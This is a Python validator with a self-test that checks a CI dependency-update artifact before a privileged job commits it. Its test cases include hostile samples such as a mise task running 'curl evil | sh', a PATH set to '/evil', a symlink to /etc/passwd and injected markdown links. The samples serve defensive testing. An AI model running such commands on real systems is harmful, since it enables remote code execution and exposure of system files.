#!/usr/bin/env python3
# Copyright © Advanced Micro Devices, Inc., or its affiliates.
#
# SPDX-License-Identifier: MIT

"""Validate the artifact the runtime-deps-update workflow's `propose` job
uploads, before `open-pr` commits it.

`propose` runs upstream code (uv builds AMD's `rocm` sdist while resolving),
so its artifact is untrusted input to a job holding a write token. This
accepts only what an update may legitimately change:

- exactly the expected files (``summary.md``, ``mise.toml``, ``mise.lock``,
  ``locks/pylock.<name>.toml``), as regular files of bounded size;
- a ``mise.toml`` identical to the base one except for the version of each
  ``[tools]`` entry. It is configuration maintainers run (``mise run``), so a
  new task, environment entry, asset pattern or setting — the cooldown
  included — is refused;
- concrete versions only (``2026.43.3``, ``0.13.7``), never ``latest`` or a
  git ref;
- a ``summary.md`` that is nothing but the table ``cargo xtask deps diff``
  prints, since it becomes the pull request body.

What the locks themselves contain is not judged here: the workflow's ``check``
job runs this commit's ``cargo xtask deps check`` against the artifact before
``open-pr`` runs, and the pull request's CI runs it again. Among other things it
requires every binary (``url`` and ``url_api``) to be a release download of its
own GitHub repository at the locked version, and every Python artifact to come
from PyPI or AMD's indexes.

Usage::

    validate_runtime_update.py <artifact-dir> <base-mise.toml>
    validate_runtime_update.py --self-test
"""

import contextlib
import io
import re
import sys
import tempfile
import tomllib
from pathlib import Path

MAX_BYTES = 5 * 1024 * 1024
# GitHub refuses a pull request body over 65536 characters, and the summary is
# the body less a few lines of text.
MAX_SUMMARY_CHARS = 60_000
ALLOWED = re.compile(
    r"^(summary\.md|mise\.toml|mise\.lock|locks/pylock\.[a-z0-9-]+\.toml)$"
)
REQUIRED = ("summary.md", "mise.toml", "mise.lock")
# A version cell starts with a digit (or is `—` for added/removed), so it can
# hold nothing GitHub would turn into a link, such as `www.example.com`.
_CELL = r"(?:[0-9][0-9A-Za-z.+!_-]*|—)"
SUMMARY_ROW = re.compile(
    rf"^\| `[A-Za-z0-9._-]+` \| `[A-Za-z0-9._:/-]+` \| {_CELL} \| {_CELL} \|$"
)
SUMMARY_HEADER = ["| Lock | Package | Before | After |", "|---|---|---|---|"]
# Must equal `NO_CHANGES` in xtask/src/deps/diff.rs; the xtask test
# `the_summary_passes_the_update_validator` runs real output through this file.
NO_CHANGES = "No runtime versions changed."
VERSION = re.compile(r"^[0-9][0-9A-Za-z.+-]*$")


class Invalid(Exception):
    pass


def versions_masked(config: dict) -> dict:
    """`config` with every `[tools]` version replaced by a placeholder."""
    tools = {}
    for name, spec in config.get("tools", {}).items():
        # A table pins its `version` key; any other value is the version
        # itself (a non-string one is refused afterwards, by name).
        if isinstance(spec, dict):
            tools[name] = (
                {**spec, "version": "<version>"} if "version" in spec else spec
            )
        else:
            tools[name] = "<version>"
    return {**config, "tools": tools}


def typed(value):
    """`value` with every scalar tagged by its type, so that `1 == True` and
    `1 == 1.0` (both true in Python) do not hide a changed setting."""
    if isinstance(value, dict):
        return {key: typed(item) for key, item in value.items()}
    if isinstance(value, list):
        return [typed(item) for item in value]
    return (type(value).__name__, value)


def check_summary(text: str) -> None:
    if len(text) > MAX_SUMMARY_CHARS:
        raise Invalid(f"summary.md is longer than {MAX_SUMMARY_CHARS} characters")
    lines = text.rstrip("\n").split("\n")
    if lines == [NO_CHANGES]:
        return
    if lines[:2] != SUMMARY_HEADER or len(lines) < 3:
        raise Invalid("summary.md is not the `cargo xtask deps diff` table")
    for line in lines[2:]:
        if not SUMMARY_ROW.fullmatch(line):
            raise Invalid(f"summary.md row is not a version change: {line[:120]!r}")


def validate(artifact: Path, base_config: Path) -> None:
    for path in sorted(artifact.rglob("*")):
        rel = path.relative_to(artifact).as_posix()
        if path.is_symlink():
            raise Invalid(f"symlink in artifact: {rel}")
        if path.is_dir():
            continue
        if not path.is_file() or not ALLOWED.fullmatch(rel):
            raise Invalid(f"unexpected artifact entry: {rel}")
        if path.stat().st_size > MAX_BYTES:
            raise Invalid(f"oversized artifact entry: {rel}")
    for required in REQUIRED:
        if not (artifact / required).is_file():
            raise Invalid(f"artifact is missing {required}")
    # The commit step deletes every committed lock the artifact lacks, so an
    # update that produced none would empty the lock directory.
    if not any((artifact / "locks").glob("pylock.*.toml")):
        raise Invalid("artifact has no locks/pylock.*.toml")

    try:
        proposed = tomllib.loads((artifact / "mise.toml").read_text(encoding="utf-8"))
        base = tomllib.loads(base_config.read_text(encoding="utf-8"))
    except (tomllib.TOMLDecodeError, UnicodeDecodeError) as err:
        raise Invalid(f"mise.toml does not parse: {err}") from err
    if typed(versions_masked(proposed)) != typed(versions_masked(base)):
        raise Invalid("mise.toml changed beyond the versions of its [tools] entries")
    for name, spec in proposed.get("tools", {}).items():
        version = spec.get("version") if isinstance(spec, dict) else spec
        if version is not None and (
            not isinstance(version, str) or not VERSION.fullmatch(version)
        ):
            raise Invalid(
                f"mise.toml pins {name} to {version!r}, which is not a concrete version"
            )
    try:
        summary = (artifact / "summary.md").read_text(encoding="utf-8")
    except UnicodeDecodeError as err:
        raise Invalid(f"summary.md is not UTF-8: {err}") from err
    check_summary(summary)


BASE = """\
[settings]
lockfile = true
minimum_release_age = "7d"

[tools]
"github:o/tool" = { version = "1.0", platforms = { linux-x64 = { asset_pattern = "tool-*-linux.tar.gz" } } }
uv = "0.13.6"

[tasks.lock]
run = "cargo xtask deps lock"
"""

TABLE = """\
| Lock | Package | Before | After |
|---|---|---|---|
| `mise.lock` | `uv` | 0.13.6 | 0.13.7 |
| `pylock.sdk-rocm10-1-linux.toml` | `torch` | 2.13.0+rocm10.1.0 | — |
"""


def self_test() -> None:
    def build(
        root: Path,
        mise_toml: str,
        summary: str = TABLE,
        extra: dict | None = None,
        tamper=None,
    ) -> tuple[Path, Path]:
        artifact = root / "update"
        (artifact / "locks").mkdir(parents=True)
        (artifact / "mise.toml").write_text(mise_toml, encoding="utf-8")
        (artifact / "mise.lock").write_text("lockfile_version = 3\n", encoding="utf-8")
        (artifact / "summary.md").write_text(summary, encoding="utf-8")
        (artifact / "locks" / "pylock.p-linux.toml").write_text("", encoding="utf-8")
        for name, body in (extra or {}).items():
            (artifact / name).write_text(body, encoding="utf-8")
        if tamper:
            tamper(artifact)
        (root / "base.toml").write_text(BASE, encoding="utf-8")
        return artifact, root / "base.toml"

    def run(
        mise_toml: str, summary: str = TABLE, extra: dict | None = None, tamper=None
    ) -> str | None:
        with tempfile.TemporaryDirectory() as tmp:
            artifact, base = build(Path(tmp), mise_toml, summary, extra, tamper)
            try:
                validate(artifact, base)
            except Invalid as err:
                return str(err)
            return None

    # The workflow fails closed only through the exit code, so `main` itself is
    # exercised: a good artifact exits 0, a bad one 1, bad usage 2.
    for label, mise_toml, expected in [
        ("main on a good artifact", BASE, 0),
        ("main on a bad artifact", BASE.replace('"7d"', '"0s"'), 1),
    ]:
        with tempfile.TemporaryDirectory() as tmp:
            artifact, base = build(Path(tmp), mise_toml)
            with contextlib.redirect_stderr(io.StringIO()):
                code = main([str(artifact), str(base)])
        if code != expected:
            raise SystemExit(f"self-test {label!r}: exit {code}, expected {expected}")
    with contextlib.redirect_stderr(io.StringIO()):
        usage_code = main([])
    if usage_code != 2:
        raise SystemExit("self-test 'main without arguments': expected exit 2")

    cases = [
        ("unchanged", BASE, TABLE, None, None),
        (
            "both versions bumped",
            BASE.replace('version = "1.0"', 'version = "2026.43.3"').replace(
                '"0.13.6"', '"0.13.9"'
            ),
            TABLE,
            None,
            None,
        ),
        (
            "cooldown turned off",
            BASE.replace('"7d"', '"0s"'),
            TABLE,
            None,
            "mise.toml changed",
        ),
        (
            "task added",
            BASE + '\n[tasks.x]\nrun = "curl evil | sh"\n',
            TABLE,
            None,
            "mise.toml changed",
        ),
        (
            "asset pattern changed",
            BASE.replace("linux.tar.gz", "windows.zip"),
            TABLE,
            None,
            "mise.toml changed",
        ),
        (
            "env added",
            BASE + '\n[env]\nPATH = "/evil"\n',
            TABLE,
            None,
            "mise.toml changed",
        ),
        (
            "tool added",
            BASE.replace('uv = "0.13.6"', 'uv = "0.13.6"\nevil = "1"'),
            TABLE,
            None,
            "mise.toml changed",
        ),
        ("unexpected file", BASE, TABLE, {"run.sh": "x"}, "unexpected artifact entry"),
        (
            "file in locks/ that is not a lock",
            BASE,
            TABLE,
            {"locks/README.md": "x"},
            "unexpected artifact entry",
        ),
        (
            "setting changed to an equal-comparing value of another type",
            BASE.replace("lockfile = true", "lockfile = 1"),
            TABLE,
            None,
            "mise.toml changed",
        ),
        (
            "version cell holding a link GitHub would render",
            BASE,
            TABLE.replace("| 0.13.7 |", "| www.evil.example |"),
            None,
            "summary.md row",
        ),
        ("nothing changed summary", BASE, "No runtime versions changed.\n", None, None),
        (
            "summary with a link",
            BASE,
            TABLE + "| `mise.lock` | `[x](https://evil.example)` | 1 | 2 |\n",
            None,
            "summary.md row",
        ),
        (
            "summary that is prose",
            BASE,
            "@someone please merge\n",
            None,
            "not the `cargo xtask deps diff` table",
        ),
        (
            "text after the no-change line",
            BASE,
            NO_CHANGES + "\n@someone please merge\n",
            None,
            "not the `cargo xtask deps diff` table",
        ),
        (
            "table with no rows",
            BASE,
            "\n".join(SUMMARY_HEADER) + "\n",
            None,
            "not the `cargo xtask deps diff` table",
        ),
        (
            "summary too long for a pull request body",
            BASE,
            TABLE + "| `mise.lock` | `uv` | 0.13.6 | 0.13.7 |\n" * 2000,
            None,
            "longer than",
        ),
    ]

    def symlink(artifact: Path) -> None:
        (artifact / "locks" / "pylock.p-linux.toml").unlink()
        (artifact / "locks" / "pylock.p-linux.toml").symlink_to("/etc/passwd")

    def oversized(artifact: Path) -> None:
        (artifact / "mise.lock").write_bytes(b"#" * (MAX_BYTES + 1))

    def newline_name(artifact: Path) -> None:
        # `re.match` with `$` accepts a trailing newline; the name must not.
        (artifact / "mise.lock\n").write_text("", encoding="utf-8")

    def binary_config(artifact: Path) -> None:
        (artifact / "mise.toml").write_bytes(b"\xff\xfe not utf-8")

    def binary_summary(artifact: Path) -> None:
        (artifact / "summary.md").write_bytes(b"\xff\xfe not utf-8")

    def no_locks(artifact: Path) -> None:
        (artifact / "locks" / "pylock.p-linux.toml").unlink()

    def missing(artifact: Path) -> None:
        (artifact / "mise.lock").unlink()

    cases += [
        (
            "table with a wrong header",
            BASE,
            TABLE.replace("| Lock | Package |", "| Lock | Name |"),
            None,
            "not the `cargo xtask deps diff` table",
        ),
        ("mise.toml that does not parse", "not = [toml", TABLE, None, "does not parse"),
        # Guards the pattern's closing `|$`: a row may not carry anything after
        # its last cell. `re.match` would refuse this too, so the case does not
        # tell `match` from `fullmatch`.
        (
            "row with text after its last cell",
            BASE,
            TABLE + "| `mise.lock` | `uv` | 1 | 2 | [x](http://evil.example)\n",
            None,
            "summary.md row",
        ),
        (
            "version with a trailing newline",
            BASE.replace('"0.13.6"', '"0.13.6\\n"'),
            TABLE,
            None,
            "not a concrete version",
        ),
        (
            "version that is not a string",
            BASE.replace('"0.13.6"', "1"),
            TABLE,
            None,
            "not a concrete version",
        ),
        (
            "version set to latest",
            BASE.replace('"0.13.6"', '"latest"'),
            TABLE,
            None,
            "not a concrete version",
        ),
        (
            "version set to a ref",
            BASE.replace('version = "1.0"', 'version = "ref:main"'),
            TABLE,
            None,
            "not a concrete version",
        ),
    ]
    tampered = [
        ("symlinked lock", symlink, "symlink in artifact"),
        ("oversized lock", oversized, "oversized artifact entry"),
        ("missing mise.lock", missing, "artifact is missing mise.lock"),
        ("no lock at all", no_locks, "has no locks/pylock.*.toml"),
        ("mise.toml that is not UTF-8", binary_config, "does not parse"),
        ("summary.md that is not UTF-8", binary_summary, "not UTF-8"),
        ("file name ending in a newline", newline_name, "unexpected artifact entry"),
    ]
    for label, tamper, expected in tampered:
        error = run(BASE, tamper=tamper)
        if error is None or expected not in error:
            raise SystemExit(
                f"self-test {label!r}: expected {expected!r}, got {error!r}"
            )

    for label, mise_toml, summary, extra, expected in cases:
        error = run(mise_toml, summary, extra)
        if expected is None and error is not None:
            raise SystemExit(f"self-test {label!r}: unexpectedly refused: {error}")
        if expected is not None and (error is None or expected not in error):
            raise SystemExit(
                f"self-test {label!r}: expected {expected!r}, got {error!r}"
            )
    print(
        f"validate_runtime_update self-test: {len(cases) + len(tampered)} cases passed"
    )


def main(argv: list[str]) -> int:
    if argv == ["--self-test"]:
        self_test()
        return 0
    if len(argv) != 2:
        print(__doc__, file=sys.stderr)
        return 2
    try:
        validate(Path(argv[0]), Path(argv[1]))
    except Invalid as err:
        print(f"refusing the update artifact: {err}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
